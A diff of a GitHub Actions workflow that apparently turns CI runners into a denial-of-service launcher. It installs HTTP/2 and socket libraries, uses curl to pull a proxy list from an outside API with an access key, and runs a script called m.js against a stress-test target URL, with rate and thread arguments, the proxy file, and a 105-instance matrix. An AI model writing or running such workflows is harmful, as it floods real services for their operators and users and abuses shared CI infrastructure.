@@ -27,11 +27,11 @@ jobs:
           # cache: 'npm'
       
       - name: Install dependencies
-        run: npm install net chalk hpack.js hpack
+        run: npm install net chalk hpack.js hpack colors
       
       - name: Run m.js
         run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > api_response.txt
-             node m.js  https://c4.dstatbot.win/NijRFz2T 400 10 100
+             node m.js https://c4.dstatbot.win/6ud35p72 400 100 10 proxy.txt
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 105
